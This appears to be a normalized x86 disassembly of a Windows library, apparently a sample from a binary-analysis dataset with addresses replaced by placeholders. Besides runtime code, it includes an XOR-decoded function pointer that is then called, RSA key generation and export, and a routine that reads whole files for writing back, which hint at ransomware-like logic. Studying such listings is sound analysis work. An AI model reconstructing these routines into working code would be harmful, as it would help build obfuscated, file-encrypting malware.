add esp 0x4
push ecx
call sub_1000d740
mov eax [ rw-data ]
add esp 0x4
test eax eax
je r-xdata
call sub_10017830
lea ecx [ ebp - 0x418 ]
push ecx
push 0x104
call [ GetCurrentDirectoryW@IAT ]
lea edx [ ebp - 0x418 ]
push edx
call [ PathAddBackslashW@IAT ]
lea edx [ ebp - 0x418 ]
call sub_10069f70
push 0x0
call [ ExitProcess@IAT ]
int3
push eax
call [ ReleaseMutex@IAT ]
mov edx [ rw-data ]
mov al 0x38
mov [ ebp - 0x41c ] edx
xor [ ebp - 0x41c ] al
xor [ ebp - 0x41b ] al
xor [ ebp - 0x41a ] al
xor [ ebp - 0x419 ] al
mov eax [ rw-data ]
push eax
call [ ebp - 0x41c ]
sub_100150a0
push ebp
mov ebp esp
push ecx
mov eax edx
push edi
mov [ ebp - 0x4 ] 0x0
lea edi [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov ecx [ ebp + 0x8 ]
sub eax edi
push eax
push edx
call sub_10067f90
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
push eax
mov ecx esi
mov [ esi ] 0x0
call sub_1000adb0
mov eax esi
pop edi
mov esp ebp
pop ebp
retn
sub_100150f0
push ebp
mov ebp esp
push 0xffffffff
push sub_10080ed0
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi [ ebp + 0x8 ]
mov eax [ ebp + 0x10 ]
sub eax [ ebp + 0xc ]
mov edi [ esi + 0x10 ]
cmp edi eax
ja r-xdata
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0xc ]
jmp r-xdata
cmp [ esi + 0x14 ] eax
je r-xdata
cmp eax [ ebp + 0x10 ]
je r-xdata
push 0x1
push eax
mov ecx esi
call sub_10003d30
test al al
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
movsx dx [ eax ]
movzx eax dx
push eax
push 0x1
mov ecx esi
call sub_10008430
mov eax [ ebp + 0xc ]
inc eax
mov [ ebp + 0xc ] eax
jmp r-xdata
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] edi
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
xor ecx ecx
mov [ eax + edi * 2 ] cx
sub_1001517f
mov esi [ ebp + 0x8 ]
cmp [ esi + 0x14 ] 0x8
jb r-xdata
xor edx edx
push edx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
push edx
mov [ esi ] dx
call sub_1000bd19
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov ecx [ esi ]
push ecx
call sub_1006591f
add esp 0x4
sub_100151c1
push 0x18
push r--data
call sub_10079bf0
or [ ebp - 0x1c ] 0xffffffff
xor edi edi
mov [ ebp - 0x24 ] edi
push 0xb
call sub_1005f1f6
pop ecx
test eax eax
jne r-xdata
push 0xb
call sub_10043f7b
pop ecx
mov [ ebp - 0x4 ] edi
or eax 0xffffffff
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10015351
mov eax [ ebp - 0x1c ]
mov esi [ edi * 4 + rw-data ]
test esi esi
je r-xdata
call sub_10079c35
retn
push 0x40
push 0x20
call sub_1000977c
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
je r-xdata
mov [ ebp - 0x20 ] esi
mov eax [ edi * 4 + rw-data ]
add eax 0x800
cmp esi eax
jae r-xdata
lea ecx [ edi * 4 + rw-data ]
mov [ ecx ] eax
add [ rw-data ] 0x20
cmp [ ebp - 0x1c ] 0xffffffff
jne r-xdata
test [ esi + 0x4 ] 0x1
jne r-xdata
shl edi 0x5
mov [ ebp - 0x1c ] edi
mov eax edi
sar eax 0x5
mov ecx edi
and ecx 0x1f
shl ecx 0x6
mov eax [ eax * 4 + rw-data ]
mov [ eax + ecx + 0x4 ] 0x1
push edi
call sub_100532a0
pop ecx
test eax eax
jne r-xdata
mov [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
mov [ eax + 0x5 ] 0xa
and [ eax + 0x8 ] 0x0
add eax 0x40
mov [ ebp - 0x20 ] eax
jmp r-xdata
inc edi
jmp r-xdata
add esi 0x40
jmp r-xdata
cmp [ esi + 0x8 ] 0x0
jne r-xdata
or [ ebp - 0x1c ] 0xffffffff
mov edx [ ecx ]
add edx 0x800
cmp eax edx
jae r-xdata
mov [ ebp - 0x28 ] edi
cmp edi 0x40
jge r-xdata
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
push 0xa
call sub_10043f7b
pop ecx
xor ebx ebx
inc ebx
mov [ ebp - 0x4 ] ebx
cmp [ esi + 0x8 ] 0x0
jne r-xdata
lea ebx [ esi + 0xc ]
push ebx
call [ EnterCriticalSection@IAT ]
test [ esi + 0x4 ] 0x1
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_10015293
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
jne r-xdata
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
push ebx
call [ LeaveCriticalSection@IAT ]
inc [ esi + 0x8 ]
mov [ ebp - 0x24 ] ebx
jmp r-xdata
mov [ esi + 0x4 ] 0x1
or [ esi ] 0xffffffff
sub esi [ edi * 4 + rw-data ]
sar esi 0x6
mov eax edi
shl eax 0x5
add esi eax
mov [ ebp - 0x1c ] esi
sub_10015360
lea ecx [ eax + eax * 2 ]
lea ecx [ ecx * 4 + r--data ]
xor eax eax
cmp [ ecx + 0x4 ] eax
jbe r-xdata
mov eax [ ecx + 0x4 ]
xor ecx ecx
mov [ edx + eax * 2 ] cx
retn
push esi
push edi
mov esi [ ecx ]
movsx esi [ esi + eax ]
movzx edi [ ecx + 0x8 ]
xor si di
xor si ax
mov edi 0xff
and si di
mov [ edx + eax * 2 ] si
inc eax
cmp eax [ ecx + 0x4 ]
jb r-xdata
pop edi
pop esi
sub_100153a1
push 0x14
mov eax sub_1007f62c
call sub_100097c8
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100014b7
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10015f10
mov ecx [ ebp + 0x8 ]
push eax
call sub_10065660
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10050f50
mov eax edi
call sub_1004db01
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1006b3d0
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10030d90
push edi
call sub_1004d80c
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_1005457d
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1000bd19
sub_1001543e
push 0x8
mov eax sub_1007f5ee
call sub_1002152b
mov esi ecx
mov [ ebp - 0x14 ] esi
call sub_1000a66f
mov ecx [ ebp + 0x8 ]
lea edi [ esi + 0x14 ]
xor ebx ebx
push edi
push ebx
mov [ edi ] eax
mov [ edi + 0x4 ] edx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
mov [ ebp - 0x4 ] ebx
call sub_100516ef
push eax
call sub_10023dc9
mov ecx [ ebp + 0x8 ]
add esp 0xc
push edi
push ebx
mov [ esi + 0x8 ] eax
call sub_100137fa
push eax
call sub_10023dc9
add esp 0xc
mov [ esi + 0xc ] eax
call sub_1000a25b
mov [ esi + 0x10 ] eax
call sub_1004db01
retn 0x4
sub_100154b5
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add ecx 0x9
push ecx
add eax 0x9
push eax
call sub_10079ce0
neg eax
pop ecx
sbb eax eax
pop ecx
inc eax
pop ebp
retn 0x4
sub_100154d5
mov edi edi
push ebp
mov ebp esp
push esi
xor eax eax
push 0xffffffff
mov esi ecx
and [ esi + 0x10 ] 0x0
push eax
push [ ebp + 0x8 ]
mov [ esi + 0x14 ] 0x7
mov [ esi ] ax
call sub_1005c9a6
mov eax esi
pop esi
pop ebp
retn 0x4
sub_10015500
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov edx [ esi + 0x4 ]
lea eax [ ecx + 0x4 ]
sub edx eax
sar edx 0x2
add edx edx
add edx edx
push edx
push eax
push ecx
call sub_10078db0
mov eax [ ebp + 0x8 ]
add esp 0xc
add [ esi + 0x4 ] 0xfffffffc
mov [ edi ] eax
mov eax edi
pop ebp
retn 0x4
sub_1001552f
push 0x14
mov eax sub_1007f62c
call sub_100097c8
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100014b7
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10015f10
mov ecx [ ebp + 0x8 ]
push eax
call sub_10065660
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10050f50
mov eax edi
call sub_1004db01
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10061aba
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10030d90
push edi
call sub_1004d80c
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_1005457d
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1000bd19
sub_100155cc
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
test eax eax
je r-xdata
pop ebp
retn
push eax
push 0x0
call sub_1002bd55
pop ecx
pop ecx
sub_100155f0
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
push r--data
lea edx [ ebp - 0x10 ]
push edx
mov [ ebp - 0x10 ] r--data
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] 0x0
call sub_1000bd19
int3
sub_10015630
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
sub esp 0x8
push esi
mov esi ecx
mov ecx [ esi + 0x4 ]
mov eax [ ecx + 0x4 ]
cmp [ eax + 0x15 ] 0x0
push edi
mov edi ecx
jne r-xdata
cmp edi [ esi + 0x4 ]
je r-xdata
mov ecx [ edx ]
lea ecx [ ecx ]
mov ecx [ edx ]
lea edx [ ebp - 0x8 ]
mov [ ebp - 0x8 ] ecx
push edx
mov ecx esi
mov [ ebp - 0x4 ] 0x0
call sub_1001b6b0
push eax
push edi
lea eax [ ebp + 0x8 ]
push eax
mov ecx esi
call sub_10048b90
mov eax [ ebp + 0x8 ]
pop edi
add eax 0x10
pop esi
mov esp ebp
pop ebp
retn 0x4
mov eax [ edx ]
cmp eax [ edi + 0xc ]
jae r-xdata
mov edi eax
mov eax [ eax ]
mov eax [ eax + 0x8 ]
jmp r-xdata
lea eax [ edi + 0x10 ]
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
cmp [ eax + 0xc ] ecx
jae r-xdata
cmp [ eax + 0x15 ] 0x0
je r-xdata
sub_100156cc
push ebp
mov ebp esp
push ecx
push ecx
push edi
xor edi edi
push edi
push 0x1
push edi
push edi
lea eax [ ebp - 0x8 ]
push eax
mov [ ebp - 0x8 ] edi
mov [ ebp - 0x4 ] edi
call [ CryptAcquireContextW@IAT ]
test eax eax
jne r-xdata
push ebx
push esi
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0x18 ]
or eax 0x80
shl eax 0x10
push eax
push 0xa400
push [ ebp - 0x8 ]
call [ CryptGenKey@IAT ]
test eax eax
jne r-xdata
inc eax
mov ebx [ ebp + 0xc ]
mov esi [ CryptExportKey@IAT ]
push ebx
push edi
push edi
push 0x6
push edi
push [ ebp - 0x4 ]
call esi
test eax eax
jne r-xdata
push 0x2
push [ ebx ]
mov ebx [ GetProcessHeap@IAT ]
push 0x8
call ebx
push eax
call [ HeapAlloc@IAT ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] eax
cmp eax edi
jne r-xdata
push [ ebp - 0x4 ]
call [ CryptDestroyKey@IAT ]
push 0x3
jmp r-xdata
pop edi
leave
retn 0x14
push [ ebp + 0xc ]
push eax
push edi
push 0x6
push edi
push [ ebp - 0x4 ]
call esi
test eax eax
jne r-xdata
push [ ebp - 0x4 ]
call [ CryptDestroyKey@IAT ]
push 0x4
jmp r-xdata
pop esi
push [ ebp + 0x14 ]
push edi
push edi
push 0x7
push edi
push [ ebp - 0x4 ]
call esi
test eax eax
jne r-xdata
push [ ebp - 0x4 ]
call [ CryptDestroyKey@IAT ]
push 0x5
jmp r-xdata
mov eax [ ebp + 0x14 ]
push [ eax ]
push 0x8
call ebx
push eax
call [ HeapAlloc@IAT ]
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
cmp eax edi
jne r-xdata
push [ ebp - 0x4 ]
call [ CryptDestroyKey@IAT ]
push 0x6
jmp r-xdata
push [ ebp + 0x14 ]
push eax
push edi
push 0x6
push edi
push [ ebp - 0x4 ]
call esi
push [ ebp - 0x4 ]
test eax eax
jne r-xdata
push [ ebp - 0x4 ]
call [ CryptDestroyKey@IAT ]
push 0x7
jmp r-xdata
call [ CryptDestroyKey@IAT ]
xor esi esi
jmp r-xdata
call [ CryptDestroyKey@IAT ]
push 0x8
jmp r-xdata
push edi
push [ ebp - 0x8 ]
call [ CryptReleaseContext@IAT ]
mov eax esi
pop esi
pop ebx
jmp r-xdata
sub_10015817
push 0x4c
mov eax sub_1007f6fe
call sub_1001bb6b
mov eax [ ebp + 0xc ]
mov edi [ ebp + 0x18 ]
mov ebx [ ebp + 0x8 ]
mov esi [ ebp + 0x20 ]
mov [ ebp - 0x44 ] eax
movzx eax [ ebp + 0x1c ]
mov [ ebp - 0x3c ] eax
mov eax [ ebp + 0x24 ]
mov [ ebp - 0x34 ] eax
lea eax [ ebp - 0x50 ]
push eax
mov ecx edi
mov [ ebp - 0x48 ] ebx
call sub_100688a0
and [ ebp - 0x4 ] 0x0
push eax
call sub_1001fccb
or [ ebp - 0x4 ] 0xffffffff
pop ecx
lea ecx [ ebp - 0x50 ]
mov [ ebp - 0x40 ] eax
call sub_10069ce0
mov ecx [ ebp - 0x40 ]
lea eax [ ebp - 0x2c ]
push eax
call sub_10051f6c
mov al [ esi ]
xor ecx ecx
inc ecx
mov [ ebp - 0x4 ] ecx
cmp al 0x2b
je r-xdata
mov [ ebp - 0x38 ] ecx
cmp al 0x2d
je r-xdata
cmp [ eax ] 0x7f
je r-xdata
lea eax [ ebp - 0x2c ]
cmp al 0x30
jne r-xdata
cmp [ edi + 0x24 ] 0x0
mov eax [ edi + 0x20 ]
jl r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax ecx
jae r-xdata
and [ ebp - 0x38 ] 0x0
jmp r-xdata
mov al [ esi + 0x1 ]
cmp al 0x78
je r-xdata
and [ ebp - 0x30 ] 0x0
jg r-xdata
cmp [ eax ] 0x0
jle r-xdata
lea eax [ ebp - 0x2c ]
cmp [ ebp - 0x18 ] 0x10
mov ecx [ ebp - 0x2c ]
mov eax ecx
jae r-xdata
mov [ ebp - 0x38 ] 0x2
jmp r-xdata
cmp al 0x58
jne r-xdata
mov ecx [ ebp - 0x40 ]
mov eax [ ecx ]
call [ eax + 0x8 ]
movzx eax ax
push eax
push [ ebp - 0x34 ]
lea eax [ ebp - 0x58 ]
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
push ebx
call sub_1005ac87
mov ecx [ eax ]
push [ ebp - 0x30 ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
push [ ebp - 0x3c ]
xor esi esi
push eax
push ecx
push [ ebp - 0x44 ]
mov [ ebp + 0x14 ] eax
push ebx
mov [ edi + 0x20 ] esi
mov [ edi + 0x24 ] esi
call sub_100582fb
add esp 0x34
push esi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10041a20
mov eax [ ebp - 0x44 ]
call sub_1004fa89
retn
cmp eax 0x100
lea eax [ ebp - 0x4c ]
je r-xdata
cmp eax [ ebp - 0x34 ]
jbe r-xdata
test eax eax
je r-xdata
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
push [ ebp - 0x38 ]
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
push ebx
call sub_1003e9ec
mov ecx [ eax ]
push [ ebp - 0x30 ]
add esi [ ebp - 0x38 ]
push [ ebp - 0x3c ]
mov [ ebp + 0x10 ] ecx
mov ecx [ eax + 0x4 ]
mov [ ebp + 0x14 ] ecx
push [ eax + 0x4 ]
mov ecx [ ebp - 0x38 ]
push [ eax ]
sub [ ebp - 0x34 ] ecx
lea eax [ ebp - 0x4c ]
push eax
push ebx
call sub_100582fb
add esp 0x30
push [ ebp - 0x30 ]
push [ ebp - 0x3c ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
push ebx
call sub_100582fb
add esp 0x18
jmp r-xdata
sub eax [ ebp - 0x34 ]
mov [ ebp - 0x30 ] eax
jmp r-xdata
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x30 ] ecx
jmp r-xdata
mov ecx [ eax ]
and [ ebp - 0x30 ] 0x0
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x14 ] eax
mov eax [ edi + 0x14 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
mov eax [ ebp - 0x30 ]
mov al [ eax ]
cmp al 0x7f
jne r-xdata
mov ebx [ ebp - 0x34 ]
jmp r-xdata
test al al
jle r-xdata
mov ebx [ ebp - 0x48 ]
mov ecx ebx
sub ecx [ ebp - 0x38 ]
movsx eax al
cmp eax ecx
jae r-xdata
sub ebx eax
mov eax [ ebp - 0x34 ]
sub eax ebx
inc eax
push eax
lea ecx [ esi + ebx ]
push ecx
push eax
lea eax [ esi + ebx + 0x1 ]
push eax
mov [ ebp - 0x54 ] ecx
call sub_1003bb2a
mov eax [ ebp - 0x54 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x30 ]
add esp 0x10
inc [ ebp - 0x34 ]
inc eax
cmp [ eax ] 0x0
jle r-xdata
mov [ ebp - 0x30 ] eax
sub_10015a50
push ebp
mov ebp esp
push ecx
push ebx
push edi
xor ebx ebx
push ebx
push 0x80
push 0x3
push ebx
push ebx
push 0xc0000000
push eax
call [ CreateFileW@IAT ]
mov edi eax
cmp edi 0xffffffff
jne r-xdata
push esi
lea ecx [ ebp - 0x4 ]
push ecx
push edi
mov [ ebp - 0x4 ] ebx
call [ GetFileSize@IAT ]
mov ecx [ ebp - 0x4 ]
mov esi eax
sub esi ecx
cmp eax 0xffffffff
jne r-xdata
pop edi
lea eax [ ebx + 0x1 ]
pop ebx
mov esp ebp
pop ebp
retn
push esi
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
test eax eax
jne r-xdata
cmp ecx ebx
jne r-xdata
mov ecx [ ebp + 0xc ]
push 0x0
push ecx
push esi
push eax
push edi
call [ ReadFile@IAT ]
cmp eax 0x1
je r-xdata
push edi
lea ebx [ eax + 0x3 ]
call [ CloseHandle@IAT ]
pop esi
pop edi
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
push edi
mov ebx 0x2
call [ CloseHandle@IAT ]
pop esi
pop edi
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
push edi
call [ CloseHandle@IAT ]
pop esi
pop edi
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
mov ebx 0x4
sub_10015b10
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0xc ]
cmp esi edi
je r-xdata
pop edi
pop esi
pop ebp
retn
nop
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] cx
add esi 0x1c
cmp esi edi
jne r-xdata
mov eax [ esi ]
push eax
call sub_1006591f
add esp 0x4
cmp [ esi + 0x14 ] 0x8
jb r-xdata
sub_10015b58
push 0x60
mov eax sub_1007f86d
call sub_1001bb6b
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
or [ ebp - 0x50 ] 0xffffffff
mov [ ebp - 0x68 ] eax
mov eax [ ebp + 0x20 ]
xor ebx ebx
mov [ ebp - 0x58 ] eax
mov eax [ ebp + 0x24 ]
inc ebx
test [ esi + 0x14 ] 0x4000
mov [ ebp - 0x54 ] ecx
mov [ ebp - 0x6c ] eax
mov ecx esi
je r-xdata
lea eax [ ebp - 0x60 ]
xor edi edi
push eax
mov [ ebp - 0x5c ] edi
call sub_100688a0
mov esi [ esi + 0x14 ]
lea ecx [ ebp - 0x5c ]
push ecx
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x54 ]
mov [ ebp - 0x4 ] 0x4
call sub_10059065
add esp 0x18
push eax
lea eax [ ebp - 0x64 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_10058a63
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x60 ]
mov esi eax
call sub_10069ce0
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x64 ] eax
je r-xdata
lea eax [ ebp - 0x54 ]
push eax
call sub_100688a0
xor edi edi
push eax
mov [ ebp - 0x4 ] edi
call sub_10004f60
pop ecx
or esi 0xffffffff
lea ecx [ ebp - 0x54 ]
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x4 ] esi
call sub_10069ce0
push edi
xor eax eax
push ebx
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x38 ] 0x7
mov [ ebp - 0x3c ] edi
mov [ ebp - 0x4c ] ax
call sub_10008780
mov ecx [ ebp - 0x50 ]
lea eax [ ebp - 0x2c ]
push eax
mov [ ebp - 0x4 ] ebx
call sub_10028071
push esi
push edi
push eax
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x2
call sub_10043930
push edi
push ebx
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] bl
call sub_10020b50
push edi
push ebx
lea ecx [ ebp - 0x4c ]
call sub_10008430
mov ecx [ ebp - 0x50 ]
lea eax [ ebp - 0x2c ]
push eax
call sub_1004ff82
push esi
push edi
push eax
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x3
call sub_10043930
push edi
push ebx
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] bl
call sub_10020b50
cmp [ ebp - 0x38 ] 0x8
mov eax [ ebp - 0x4c ]
jae r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100081b8
test al al
mov eax [ ebp - 0x58 ]
je r-xdata
cmp [ ebp - 0x5c ] edi
jne r-xdata
push eax
push 0x2
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_1004dca7
add esp 0x10
push edi
push ebx
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x4 ] esi
call sub_10020b50
jmp r-xdata
lea eax [ ebp - 0x4c ]
cmp [ ebp - 0x50 ] edi
jge r-xdata
or [ eax ] ebx
cmp esi ebx
ja r-xdata
mov ecx [ ebp - 0x6c ]
setne al
mov [ ecx ] al
or [ eax ] 0x2
jmp r-xdata
mov [ ebp - 0x50 ] esi
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x68 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_1004fa89
retn 0x20
sub_10015d05
push 0x14
mov eax sub_1007f62c
call sub_100097c8
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100014b7
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10015f10
mov ecx [ ebp + 0x8 ]
push eax
call sub_10065660
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10050f50
mov eax edi
call sub_1004db01
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1006c75b
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10030d90
push edi
call sub_1004d80c
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_1005457d
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1000bd19
sub_10015dc0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov eax [ ebp + 0x8 ]
mov esi ecx
test eax eax
je r-xdata
mov eax [ esi + 0x10 ]
or edx 0xffffffff
sub edx eax
cmp edx edi
ja r-xdata
mov edx [ esi + 0x14 ]
cmp edx 0x8
jb r-xdata
test edi edi
je r-xdata
push r--data
call sub_1002c5ed
cmp eax ecx
jb r-xdata
mov ecx [ esi ]
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
lea ebx [ eax + edi ]
cmp ebx 0x7ffffffe
jbe r-xdata
cmp edx 0x8
jb r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx ebx
jae r-xdata
push r--data
call sub_1002c5ed
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
test ebx ebx
jne r-xdata
push eax
push ebx
mov ecx esi
call sub_1004d170
test ebx ebx
je r-xdata
cmp edx 0x8
jb r-xdata
mov ebx [ esi + 0x10 ]
lea ecx [ ecx + ebx * 2 ]
cmp ecx eax
jbe r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0x8
jb r-xdata
mov [ esi + 0x10 ] ebx
cmp ecx 0x8
jb r-xdata
mov ecx esi
sub eax ecx
sar eax 0x1
push eax
push esi
mov eax edi
call sub_100446e0
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov ecx [ esi ]
sub eax ecx
sar eax 0x1
push eax
push esi
mov eax edi
call sub_100446e0
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
pop edi
mov eax esi
xor ecx ecx
pop esi
mov [ eax ] cx
pop ebx
pop ebp
retn 0x4
mov eax [ esi ]
xor ecx ecx
pop edi
mov [ eax ] cx
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp eax 0x8
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov edx [ esi + 0x10 ]
push edx
add edi edi
push ecx
add eax edi
push eax
call sub_1001bb10
add esp 0xc
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov eax esi
xor edx edx
mov [ eax + ebx * 2 ] dx
mov eax [ esi ]
xor edx edx
mov [ eax + ebx * 2 ] dx
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
mov ecx [ ebp + 0x8 ]
push edi
push ecx
push eax
call sub_100796a0
add esp 0xc
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] ebx
jb r-xdata
sub_10015f10
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
pop esi
mov esp ebp
pop ebp
retn
push 0x0
lea ecx [ ebp - 0x4 ]
call sub_100014b7
cmp [ esi ] 0x0
jne r-xdata
lea ecx [ ebp - 0x4 ]
call sub_10050f50
mov eax [ rw-data ]
inc eax
mov [ rw-data ] eax
mov [ esi ] eax
sub_10015f47
push 0x60
mov eax sub_1007f54e
call sub_1001bb6b
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov [ ebp - 0x60 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x54 ] eax
mov eax [ ebp + 0x24 ]
or edi 0xffffffff
test [ esi + 0x14 ] 0x4000
mov [ ebp - 0x64 ] ecx
mov [ ebp - 0x68 ] eax
mov [ ebp - 0x50 ] edi
mov ecx esi
je r-xdata
lea eax [ ebp - 0x5c ]
xor ebx ebx
push eax
mov [ ebp - 0x58 ] ebx
call sub_100688a0
mov esi [ esi + 0x14 ]
lea ecx [ ebp - 0x58 ]
push ecx
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x64 ]
mov [ ebp - 0x4 ] 0x4
call sub_1002b6c2
add esp 0x18
push eax
lea eax [ ebp - 0x6c ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_10058a63
add esp 0x10
lea ecx [ ebp - 0x5c ]
mov esi eax
mov [ ebp - 0x4 ] edi
call sub_10069ce0
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x6c ] eax
je r-xdata
lea eax [ ebp - 0x50 ]
push eax
call sub_100688a0
xor ebx ebx
push eax
mov [ ebp - 0x4 ] ebx
call sub_1005434f
pop ecx
